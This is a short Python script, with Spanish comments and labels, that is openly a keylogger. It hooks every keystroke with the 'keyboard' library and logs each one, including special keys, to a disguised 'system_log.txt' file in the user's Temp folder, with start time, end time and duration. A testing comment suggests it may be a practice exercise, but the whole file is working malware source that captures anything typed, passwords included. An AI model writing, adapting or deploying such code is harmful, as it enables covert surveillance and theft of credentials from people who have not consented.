import keyboard 
import time 
import os 
import datetime 

def keylogger():
    log_file = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "system_log.txt")

    inicio = datetime.datetime.now()

    def save_key(tecla):
        try:
            with open (log_file, "a", encoding="utf-8") as f:
                f.write(tecla)
        except Exception as e:
            pass

    def on_key_event(event):
        if event.event_type == keyboard.KEY_DOWN:
            special_keys = {
                'space': ' ',
                'enter': '\n[ENTER]\n',
                'backspace': '[BORRAR]',  
                'tab': '[TAB]',
                'caps lock': '[BLOQ_MAYUS]',
                'esc': '[ESC]',
                'windows': '[WIN]',
                'menu': '[MENU]',
                'up': '[FLECHA_ARRIBA]',
                'down': '[FLECHA_ABAJO]', 
                'left': '[FLECHA_IZQ]',
                'right': '[FLECHA_DER]',
                'delete': '[SUPR]',
                'insert': '[INS]',
                'home': '[INICIO]',
                'end': '[FIN]',
                'page up': '[AVPAG]',
                'page down': '[REPAG]'
            }

            key_char = special_keys.get(event.name, event.name)
            if event.name in ['shift', 'ctrl', 'alt', 'right shift', 'left shift', 
                            'right ctrl', 'left ctrl', 'right alt', 'left alt', 'windows']:
                return
            elif len(key_char) > 1 and key_char not in special_keys.values():
                key_char = f'[{key_char.upper()}]'

            save_key(key_char)

    try:
        with open(log_file, "w", encoding="utf-8") as f:
            f.write(f"Inicio: {inicio}\n")
    except Exception as e:
        return
    
    keyboard.hook(on_key_event)
    print("keylogger activo en segundo plano")
    
    try:
        while True:
            time.sleep(0.1)  #bajo consumo - verificación cada 100ms
    except KeyboardInterrupt:

        cierre = datetime.datetime.now()
        cierre_str = cierre.strftime("%Y-%m-%d %H:%M:%S")
        duracion = cierre - inicio
        keyboard.unhook_all()

    try:
        with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"\nFin: {cierre_str}\n")
                f.write(f"Duración: {duracion}")
    except Exception as e:
            return

    #solo para prueba
    print(f"\nguardado en {log_file}")

if __name__ == "__main__":
    keylogger()   
